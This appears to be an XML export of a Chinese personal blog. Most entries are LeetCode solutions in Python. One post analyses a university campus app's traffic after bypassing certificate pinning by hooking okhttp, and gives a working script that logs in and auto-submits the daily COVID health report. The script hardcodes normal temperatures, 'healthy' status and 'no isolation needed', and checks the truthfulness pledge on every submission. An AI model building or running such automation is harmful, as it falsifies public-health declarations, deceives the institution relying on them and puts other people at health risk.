    <content type="text"><![CDATA[题目：1877. 数组中最大数对和的最小值难度：中等 一个数对 (a,b) 的 数对和 等于 a + b 。最大数对和 是一个数对数组中最大的 数对和 。 比方说，如果我们有数对 (1,5) ，(2,3) 和 (4,4)，最大数对和 为 max(1+5, 2+3, 4+4) = max(6, 5, 8) = 8 。 给你一个长度为 偶数 n 的数组 nums ，请你将 nums 中的元素分成 n / 2 个数对，使得： nums 中每个元素 恰好 在 一个 数对中，且 最大数对和 的值 最小 。 请你在最优数对划分的方案下，返回最小的 最大数对和 。 示例 1： 1234输入：nums = [3,5,2,3]输出：7解释：数组中的元素可以分为数对 (3,3) 和 (5,2) 。最大数对和为 max(3+3, 5+2) = max(6, 7) = 7 。 示例 2： 1234输入：nums = [3,5,4,2,4,6]输出：8解释：数组中的元素可以分为数对 (3,5)，(4,4) 和 (6,2) 。最大数对和为 max(3+5, 4+4, 6+2) = max(8, 8, 8) = 8 。 提示： n == nums.length 2 &lt;= n &lt;= 105 n 是 偶数 。 1 &lt;= nums[i] &lt;= 105 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimize-maximum-pair-sum-in-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 排个序，然后最小和最大的组成数对，第二小和第二大的组成数对，以此类推 解题代码12345678class Solution: def minPairSum(self, nums: List[int]) -&gt; int: nums.sort() ans = 0 n = len(nums) for i in range(n // 2): ans = max(ans,nums[i] + nums[n - i - 1]) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>排序</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[超详细i至诚app打卡流程分析与自动打卡实现]]></title>
    <url>%2Fposts%2F5a29fa14%2F</url>
    <content type="text"><![CDATA[背景受人之托，分析了一下i至诚app（是由树维公司出的一款套壳app）的打卡流程，并实现了自动化，app版本是v1.1.2，记录一下 开始app下载地址http://www.fdzcxy.edu.cn/ueditor/asp/upload/file/20200305/zcxy_v1_1_2.apk 抓包我使用的工具是fiddler，这个app本质上是一个weex构建的基于vue的套壳app项目，登陆时使用的是okhttp框架 并有一定程度的证书校验，因此抓包时用老办法（hook okhttp）绕过一下，然后局域网下设置好代理之后，就可以抓包了，过程不再赘述 报文分析登陆i至诚使用的是jwt token认证 请求报文如下 123456POST https://superapp.fdzcxy.edu.cn/auth-server/jwt/token/login?username=用户名&amp;password=密码 HTTP/1.1Content-Length: 0Host: superapp.fdzcxy.edu.cnConnection: Keep-AliveAccept-Encoding: gzipUser-Agent: okhttp/3.12.1 响应报文如下，登陆成功会返回jwt token，失败会直接403 1234567891011121314HTTP/1.1 200Server: nginx/1.16.1Date: Mon, 19 Jul 2021 07:27:01 GMTContent-Type: text/plain;charset=UTF-8Connection: keep-aliveVary: Accept-EncodingX-Content-Type-Options: nosniffX-XSS-Protection: 1; mode=blockCache-Control: no-cache, no-store, max-age=0, must-revalidatePragma: no-cacheExpires: 0X-Frame-Options: DENYeyJhbGciOiJSUzUxMiJ9eyJzdWIiOiLlrablj7ciLCJST0xFUyI6IlJPTEVfQURNSU4sYWRtaW5pc3RyYXRvcix1c2VyIiwiY3JlYXRlZCI6MTYyNjY5NjA1NTkzMiwiZXhwIjoxNjI5Mjg4MDU1fS5zaWduYXR1cmU= 这里简单介绍一下jwt（是一种基于token的鉴权机制），jwt token通常由三部分构成，格式是这样的：header.payload.signature 所以上面的响应可以直接解析为： header：声明类型和加密的算法 1&#123;"alg":"RS512"&#125; payload：存放有效信息 123456&#123;"sub": "学号",#subject，标识实体"ROLES": "ROLE_ADMIN,administrator,user","created": 1626696055932,#创建时间"exp": 1629288055,#expire，过期时间&#125; signature：可以理解为签名 1是一串RSA私钥加密之后的密文，由于泄露个人信息，已打码处理 分析登陆时其实可以不用抓包处理，因为树维公司其实提供了文档，链接：https://superapp.fdzcxy.edu.cn/auth-server/doc/index#%E7%99%BB%E5%BD%95 然后文档中还顺带把公钥给我们了，基于此，顺带写了一个验签工具，并把之前抓包的jwt token解密出来了 该工具需要的maven依赖 12345&lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt;&lt;/dependency&gt; 工具源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import io.jsonwebtoken.Claims;import io.jsonwebtoken.Jwts;import java.security.Key;import java.security.KeyFactory;import java.security.NoSuchAlgorithmException;import java.security.interfaces.RSAPublicKey;import java.security.spec.InvalidKeySpecException;import java.security.spec.X509EncodedKeySpec;import java.util.Base64;public class Main &#123; public static void main(String[] args) throws InvalidKeySpecException, NoSuchAlgorithmException &#123; getClaimsFromToken("你抓到的jwt token"); &#125; public static RSAPublicKey stringToPublicKey(String publicKeyPem) throws NoSuchAlgorithmException, InvalidKeySpecException &#123; //System.out.println(publicKeyPem); if (publicKeyPem.startsWith("-----BEGIN PUBLIC KEY-----")) &#123; publicKeyPem = publicKeyPem.replaceAll("-----BEGIN PUBLIC KEY-----", ""); &#125; if (publicKeyPem.endsWith("-----END PUBLIC KEY-----")) &#123; publicKeyPem = publicKeyPem.replaceAll("-----END PUBLIC KEY-----", ""); &#125; publicKeyPem = publicKeyPem.replaceAll("\n", ""); //System.out.println(publicKeyPem); X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(Base64.getMimeDecoder().decode(publicKeyPem)); KeyFactory x509KeyFactory = KeyFactory.getInstance("RSA"); RSAPublicKey x509PublicKey = (RSAPublicKey) x509KeyFactory.generatePublic(x509KeySpec); return x509PublicKey; &#125; public static Key getPublicKey() throws InvalidKeySpecException, NoSuchAlgorithmException &#123; String publicKeyPem = "-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDBQw6TmvJ+nOuRaLoHsZJGIBzRg/wbskNv6UevL3/nQioYooptPfdIHVzPiKRVT5+DW5+nqzav3DOxY+HYKjO9nFjYdj0sgvRae6iVpa5Ji1wbDKOvwIDNukgnKbqvFXX2Isfl0RxeN3uEKdjeFGGFdr38I3ADCNKFNxtbmfqvjQIDAQAB -----END PUBLIC KEY-----"; Key publicKey = stringToPublicKey(publicKeyPem); return publicKey; &#125; static Claims getClaimsFromToken(String token) throws InvalidKeySpecException, NoSuchAlgorithmException &#123; Key publicKey = getPublicKey(); Claims claims; try &#123; claims = Jwts.parser().setSigningKey(publicKey).parseClaimsJws(token).getBody(); System.out.println(claims); &#125; catch (Exception e) &#123; e.printStackTrace(); claims = null; &#125; return claims; &#125;&#125; 解密出来的明文如下：其实就是把payload加密了一下 1&#123;sub=学号, ROLES=ROLE_ADMIN,administrator,user, created=1626696055932, exp=1629288055&#125; 每日健康上报在i至诚app中，除了登陆，几乎其他所有的功能都是用webview加载的vue项目，每日健康上报功能也是这样，而在这些应用中，几乎都没有证书验证，因此可以直接抓包，或者在浏览器中访问，所以这里最简单的方式，当然是无脑的使用自动化测试框架啦（虽然慢是慢点，因为浏览器渲染是一个比较耗时的操作），我并没有采用这种方式，我选择的是直接分析整个流程，然后模拟提交，不依赖浏览器的渲染 大体上有这么几个过程：请求每日健康上报 -&gt; 重定向并获取sessionID -&gt; 激活sessionid -&gt; 获取打卡信息，jsConfId和callbackConfId -&gt; 提交打卡信息 自动化经过上面的分析，最终的成品如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# -*- coding: utf-8 -*-from urllib.parse import quoteimport requestsimport timeimport reusername = '学号'password = '密码'name = '姓名'pattern = re.compile(r'[a-zA-Z0-9]&#123;8&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;4&#125;-[a-zA-Z0-9]&#123;12&#125;')def login(): url = 'https://superapp.fdzcxy.edu.cn/auth-server/jwt/token/login' headers = &#123; 'Host': 'superapp.fdzcxy.edu.cn', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.12.1', &#125; data = &#123; 'username': username, 'password': password, &#125; res = requests.post(url=url, headers=headers, data=data) # print(res.text) return res.textdef daka(token): # 请求每日健康上报，获取必要的信息 url = 'http://dw10.fdzcxy.edu.cn/datawarn/home/handle.action?redirectUrl=app/yibao.frm' headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 SuperApp', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'authorization': 'JWTToken ' + token, 'usertoken': token, 'jwttoken': token, 'X-Requested-With': 'com.lantu.MobileCampus.zcxy', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Cookie': 'userToken=' + token &#125; res = requests.get(url, headers=headers, allow_redirects=False) url = 'http://dw10.fdzcxy.edu.cn/' + res.headers['location'] reffer = url # print(url) # 获取sessionID res = requests.get(url=url, headers=headers) sessionID = pattern.search(res.text)[0] # print(sessionID) # 更新JSESSIONID url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/resources?path=/com/fr/web/core/js/vancharts-all.js&amp;deviceType=iPhone&amp;buildVersion=2020.12.02.10.19.36.340' headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', &#125; res = requests.get(url=url, headers=headers) cookie = 'JSESSIONID=' + requests.utils.dict_from_cookiejar(res.cookies)['JSESSIONID'] # print(cookie) # 激活sessionid的必要步骤 url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/url/mobile/view/firstdata?op=h5&amp;cmd=firstdata&amp;userno=' + username + '&amp;token=' + token + '&amp;__parameters__=&#123;&#125;&amp;sessionID=' + sessionID # print(url) headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'responseType': 'json', 'terminal': 'H5', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', '__device__': 'unknown', 'Accept': 'application/json, text/plain, */*', 'Cache-Control': 'no-cache', 'clientType': 'mobile/h5_5.0', 'deviceType': 'unknown', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', &#125; res = requests.get(url=url, headers=headers) # print(res.text) # 获取打卡信息，jsConfId和callbackConfId url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/view/form?sessionID=' + sessionID + '&amp;op=fr_form&amp;cmd=load_content&amp;toVanCharts=true&amp;fine_api_v_json=3&amp;widgetVersion=1' res = requests.get(url=url, headers=headers) # print(res.text) # 不嫌麻烦的话，可以写一个逻辑构建打卡所需要提交的表单，这里我就偷懒了 items = res.json()['items'][0]['el']['items'] for i in items: if i['widgetName'] == 'SUBMIT': submit = i['listeners'][0]['action'] break # print(submit) jsConfId = pattern.findall(submit)[0] callbackConfId = pattern.findall(submit)[1] # print(jsConfId, callbackConfId) # 提交打卡信息 url = 'http://dw10.fdzcxy.edu.cn/datawarn/decision/view/form' headers = &#123; 'Host': 'dw10.fdzcxy.edu.cn', 'Connection': 'keep-alive', 'terminal': 'H5', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', '__device__': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json, text/plain, */*', 'Cache-Control': 'no-cache', 'sessionID': sessionID, 'clientType': 'mobile/h5_5.0', 'deviceType': 'unknown', 'Origin': 'http://dw10.fdzcxy.edu.cn', 'Referer': reffer, 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': cookie, &#125; data = &#123; 'op': 'dbcommit', '__parameters__': quote( '&#123;"jsConfId":"' + jsConfId + '","callbackConfId":"' + callbackConfId + '","LABEL2":" 每日健康上报","XH":"' + username + '","XM":"' + name + '","LABEL12":"","LABEL0":"1. 目前所在位置:","SHENG":"350000","SHI":"福州市","QU":"鼓楼区","LABEL11":"2.填报时间:","SJ":"' + time.strftime( "%Y-%m-%d %H:%M:%S", time.localtime()) + '","LABEL1":"3. 今日体温是否正常？(体温小于37.3为正常)","TWZC":"正常","LABEL6":"目前体温为：","TW":"0","TXWZ":"350000福州市鼓楼区","LABEL9":"4. 昨日午检体温:","WUJ":"36.4","LABEL8":"5. 昨日晚检体温:","WJ":"36.5","LABEL10":"6. 今日晨检体温:","CJ":"36.4","LABEL3":"7. 今日健康状况？","JK":["健康"],"JKZK":"","QTB":"请输入具体症状：","QT":" ","LABEL4":"8. 近14日你和你的共同居住者(包括家庭成员、共同租住的人员)是否存在确诊、疑似、无症状新冠感染者？","WTSQK":["无以下特殊情况"],"SFXG":"","LABEL5":"9. 今日隔离情况？","GLQK":"无需隔离","LABEL7":"* 本人承诺以上所填报的内容全部真实，并愿意承担相应责任。","CHECK":true,"DWWZ":&#123;&#125;,"SUBMIT":"提交信息"&#125;'), &#125; # print(data) res = requests.post(url=url, headers=headers, data=data) if res.text: return Truedef main_handler(event, context): token = login() # print(token) if daka(token): return 'success'if __name__ == '__main__': print(main_handler(&#123;&#125;, &#123;&#125;)) 依赖 12345certifi==2021.5.30charset-normalizer==2.0.1idna==3.2requests==2.26.0urllib3==1.26.6 挂云函数配置触发器定时执行或者放云服务器设置定时执行就好了 配置触发器参考文档：https://cloud.tencent.com/document/product/583/9708 其他，比如打卡成功后发封邮件提示之类的，就自己发挥了（我懒]]></content>
      <categories>
        <category>爬虫</category>
        <category>抓包</category>
      </categories>
      <tags>
        <tag>python3</tag>
        <tag>爬虫</tag>
        <tag>自动打卡</tag>
        <tag>i至诚</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/19]]></title>
    <url>%2Fposts%2F879e2a5d%2F</url>
    <content type="text"><![CDATA[题目：1838. 最高频元素的频数难度：中等 元素的 频数 是该元素在一个数组中出现的次数。 给你一个整数数组 nums 和一个整数 k 。在一步操作中，你可以选择 nums 的一个下标，并将该下标对应元素的值增加 1 。 执行最多 k 次操作后，返回数组中最高频元素的 最大可能频数 。 示例 1： 1234输入：nums = [1,2,4], k = 5输出：3解释：对第一个元素执行 3 次递增操作，对第二个元素执 2 次递增操作，此时 nums = [4,4,4] 。4 是数组中最高频元素，频数是 3 。 示例 2： 123456输入：nums = [1,4,8,13], k = 5输出：2解释：存在多种最优解决方案：- 对第一个元素执行 3 次递增操作，此时 nums = [4,4,8,13] 。4 是数组中最高频元素，频数是 2 。- 对第二个元素执行 4 次递增操作，此时 nums = [1,8,8,13] 。8 是数组中最高频元素，频数是 2 。- 对第三个元素执行 5 次递增操作，此时 nums = [1,4,13,13] 。13 是数组中最高频元素，频数是 2 。 示例 3： 12输入：nums = [3,9,6], k = 2输出：1 提示： 1 &lt;= nums.length &lt;= 105 1 &lt;= nums[i] &lt;= 105 1 &lt;= k &lt;= 105 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/frequency-of-the-most-frequent-element/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 滑动窗口，枚举每一个元素，朴素的枚举会超时，需要优化 解题代码朴素的滑动窗口枚举，在第54个测试用例超时 1234567891011121314151617class Solution: def maxFrequency(self, nums: List[int], k: int) -&gt; int: nums.sort() ans = 1 n = len(nums) for i in range(n): l = i r = l + 1 t = 0 while r &lt; n and t &lt;= k: t += (nums[r] - nums[r - 1]) * (r - l) if t &gt; k: break # print(l,r,t) r += 1 ans = max(ans,r - l) return ans 优化，去掉部分无意义的枚举，AC 1234567891011121314class Solution: def maxFrequency(self, nums: List[int], k: int) -&gt; int: nums.sort() ans = 1 n = len(nums) l = 0 t = 0 for r in range(1,n): t += (nums[r] - nums[r - 1]) * (r - l) while t &gt; k: t -= nums[r] - nums[l] l += 1 ans = max(ans,r - l + 1) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>滑动窗口</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/18]]></title>
    <url>%2Fposts%2Ff0991acb%2F</url>
    <content type="text"><![CDATA[题目：面试题 10.02. 变位词组难度：中等 编写一种方法，对字符串数组进行排序，将所有变位词组合在一起。变位词是指字母相同，但排列不同的字符串。 注意： 本题相对原题稍作修改 示例: 1234567输入: [&quot;eat&quot;, &quot;tea&quot;, &quot;tan&quot;, &quot;ate&quot;, &quot;nat&quot;, &quot;bat&quot;],输出:[ [&quot;ate&quot;,&quot;eat&quot;,&quot;tea&quot;], [&quot;nat&quot;,&quot;tan&quot;], [&quot;bat&quot;]] 说明： 所有输入均为小写字母。 不考虑答案输出的顺序。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/group-anagrams-lcci/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 对每个字符串排序，然后建立哈希表即可 解题代码123456class Solution: def groupAnagrams(self, strs: List[str]) -&gt; List[List[str]]: d = defaultdict(list) for s in strs: d[''.join(sorted(list(s)))].append(s) return list(d.values())]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>哈希表</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/17]]></title>
    <url>%2Fposts%2F6026075a%2F</url>
    <content type="text"><![CDATA[题目：剑指 Offer 42. 连续子数组的最大和难度：简单 输入一个整型数组，数组中的一个或连续多个整数组成一个子数组。求所有子数组的和的最大值。 要求时间复杂度为O(n)。 示例1: 123输入: nums = [-2,1,-3,4,-1,2,1,-5,4]输出: 6解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 提示： 1 &lt;= arr.length &lt;= 10^5 -100 &lt;= arr[i] &lt;= 100 注意：本题与主站 53 题相同：https://leetcode-cn.com/problems/maximum-subarray/ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/lian-xu-zi-shu-zu-de-zui-da-he-lcof/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 看注释 解题代码123456789class Solution: def maxSubArray(self, nums: List[int]) -&gt; int: # dp[i]表示以nums[i]结尾的子数组最大和 n = len(nums) dp = [0] * n dp[0] = nums[0] for i in range(1,n): dp[i] = max(nums[i],dp[i - 1] + nums[i]) return max(dp)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>动态规划</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/16]]></title>
    <url>%2Fposts%2F172137cc%2F</url>
    <content type="text"><![CDATA[题目：剑指 Offer 53 - I. 在排序数组中查找数字 I难度：简单 统计一个数字在排序数组中出现的次数。 示例 1: 12输入: nums = [5,7,7,8,8,10], target = 8输出: 2 示例 2: 12输入: nums = [5,7,7,8,8,10], target = 6输出: 0 限制： 0 &lt;= 数组长度 &lt;= 50000 注意： 本题与主站 34 题相同（仅返回值不同）：https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 分治算法 解题代码12345678910111213141516171819class Solution: def search(self, nums: List[int], target: int) -&gt; int: return self.solove(nums,target,0,len(nums) - 1) def solove(self,nums,target,left,right): if len(nums) == 0: return 0 if left &lt; right: mid = (left + right) // 2 if nums[mid] &lt; target: return self.solove(nums,target,mid + 1,right) elif nums[mid] &gt; target: return self.solove(nums,target,left,mid) else: return self.solove(nums,target,left,mid) + self.solove(nums,target,mid + 1,right) else: if nums[left] == target: return 1 else: return 0]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>分治算法</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/15]]></title>
    <url>%2Fposts%2F8e286676%2F</url>
    <content type="text"><![CDATA[题目：1846. 减小和重新排列数组后的最大元素难度：中等 给你一个正整数数组 arr 。请你对 arr 执行一些操作（也可以不进行任何操作），使得数组满足以下条件： arr 中 第一个 元素必须为 1 。 任意相邻两个元素的差的绝对值 小于等于 1 ，也就是说，对于任意的 1 &lt;= i &lt; arr.length （数组下标从 0 开始），都满足 abs(arr[i] - arr[i - 1]) &lt;= 1 。abs(x) 为 x 的绝对值。 你可以执行以下 2 种操作任意次： 减小 arr 中任意元素的值，使其变为一个 更小的正整数 。 重新排列 arr 中的元素，你可以以任意顺序重新排列。 请你返回执行以上操作后，在满足前文所述的条件下，arr 中可能的 最大值 。 示例 1： 12345输入：arr = [2,2,1,2,1]输出：2解释：我们可以重新排列 arr 得到 [1,2,2,2,1] ，该数组满足所有条件。arr 中最大元素为 2 。 示例 2： 123456789输入：arr = [100,1,1000]输出：3解释：一个可行的方案如下：1. 重新排列 arr 得到 [1,100,1000] 。2. 将第二个元素减小为 2 。3. 将第三个元素减小为 3 。现在 arr = [1,2,3] ，满足所有条件。arr 中最大元素为 3 。 示例 3： 123输入：arr = [1,2,3,4,5]输出：5解释：数组已经满足所有条件，最大元素为 5 。 提示： 1 &lt;= arr.length &lt;= 105 1 &lt;= arr[i] &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-element-after-decreasing-and-rearranging/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心，证明请看三叶小姐姐的题解，yyds 解题代码123456789class Solution: def maximumElementAfterDecrementingAndRearranging(self, arr: List[int]) -&gt; int: arr.sort() n = len(arr) arr[0] = 1 for i in range(1,n): if arr[i] - arr[i - 1] &gt; 1: arr[i] = arr[i - 1] + 1 return arr[n - 1]]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>贪心算法</tag>
        <tag>排序</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/14]]></title>
    <url>%2Fposts%2Ff92f56e0%2F</url>
    <content type="text"><![CDATA[题目：1818. 绝对差值和难度：中等 给你两个正整数数组 nums1 和 nums2 ，数组的长度都是 n 。 数组 nums1 和 nums2 的 绝对差值和 定义为所有 |nums1[i] - nums2[i]|（0 &lt;= i &lt; n）的 总和（下标从 0 开始）。 你可以选用 nums1 中的 任意一个 元素来替换 nums1 中的 至多 一个元素，以 最小化 绝对差值和。 在替换数组 nums1 中最多一个元素 之后 ，返回最小绝对差值和。因为答案可能很大，所以需要对 109 + 7 取余后返回。 |x| 定义为： 如果 x &gt;= 0 ，值为 x ，或者 如果 x &lt;= 0 ，值为 -x 示例 1： 123456输入：nums1 = [1,7,5], nums2 = [2,3,5]输出：3解释：有两种可能的最优方案：- 将第二个元素替换为第一个元素：[1,7,5] =&gt; [1,1,5] ，或者- 将第二个元素替换为第三个元素：[1,7,5] =&gt; [1,5,5]两种方案的绝对差值和都是 |1-2| + (|1-3| 或者 |5-3|) + |5-5| = 3 示例 2： 123输入：nums1 = [2,4,6,8,10], nums2 = [2,4,6,8,10]输出：0解释：nums1 和 nums2 相等，所以不用替换元素。绝对差值和为 0 示例 3**：** 1234输入：nums1 = [1,10,4,4,2,7], nums2 = [9,3,5,1,7,4]输出：20解释：将第一个元素替换为第二个元素：[1,10,4,4,2,7] =&gt; [10,10,4,4,2,7]绝对差值和为 |10-9| + |10-3| + |4-5| + |4-1| + |2-7| + |7-4| = 20 提示： n == nums1.length n == nums2.length 1 &lt;= n &lt;= 105 1 &lt;= nums1[i], nums2[i] &lt;= 105 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-absolute-sum-difference/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 参考了三叶小姐姐的题解 解题代码]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>二分查找</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/12]]></title>
    <url>%2Fposts%2F104cf3d5%2F</url>
    <content type="text"><![CDATA[题目：275. H 指数 II难度：中等 给定一位研究者论文被引用次数的数组（被引用次数是非负整数），数组已经按照 升序排列。编写一个方法，计算出研究者的 h 指数。 h 指数的定义: “h 代表“高引用次数”（high citations），一名科研人员的 h 指数是指他（她）的 （N 篇论文中）总共有 h 篇论文分别被引用了至少 h 次。（其余的 N - h 篇论文每篇被引用次数*不多于 *h 次。）” 示例: 1234输入: citations = [0,1,3,5,6]输出: 3 解释: 给定数组表示研究者总共有 5 篇论文，每篇论文相应的被引用了 0, 1, 3, 5, 6 次。 由于研究者有 3 篇论文每篇至少被引用了 3 次，其余两篇论文每篇被引用不多于 3 次，所以她的 h 指数是 3。 说明: 如果 h 有多有种可能的值 ，h 指数是其中最大的那个。 进阶： 这是 H 指数 的延伸题目，本题中的 citations 数组是保证有序的。 你可以优化你的算法到对数时间复杂度吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/h-index-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 有序数组中mid右边的项一定大于等于mid位置的元素 解题代码123456789101112class Solution: def hIndex(self, citations: List[int]) -&gt; int: n = len(citations) left = 0 right = len(citations) - 1 while left &lt;= right: mid = (left + right) // 2 if citations[mid] &gt;= n - mid: right = mid - 1 else: left = mid + 1 return n - left]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>二分查找</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/11]]></title>
    <url>%2Fposts%2F8945a26f%2F</url>
    <content type="text"><![CDATA[题目：274. H 指数难度：中等 给定一位研究者论文被引用次数的数组（被引用次数是非负整数）。编写一个方法，计算出研究者的 h 指数。 h 指数的定义：h 代表“高引用次数”（high citations），一名科研人员的 h 指数是指他（她）的 （N 篇论文中）总共有 h 篇论文分别被引用了至少 h 次。且其余的 N - h 篇论文每篇被引用次数不超过h 次。 例如：某人的 h 指数是 20，这表示他已发表的论文中，每篇被引用了至少 20 次的论文总共有 20 篇。 示例： 1234输入：citations = [3,0,6,1,5]输出：3 解释：给定数组表示研究者总共有 5 篇论文，每篇论文相应的被引用了 3, 0, 6, 1, 5 次。 由于研究者有 3 篇论文每篇 至少 被引用了 3 次，其余两篇论文每篇被引用 不多于 3 次，所以她的 h 指数是 3。 提示： 如果 h 有多种可能的值，h 指数是其中最大的那个。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/h-index/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 排序后找h指数即可 解题代码123456789class Solution: def hIndex(self, citations: List[int]) -&gt; int: citations.sort() h = 0 i = len(citations) - 1 while i &gt;= 0 and citations[i] &gt; h: h += 1 i -= 1 return h]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>字符串</tag>
        <tag>排序</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/10]]></title>
    <url>%2Fposts%2Ffe4292f9%2F</url>
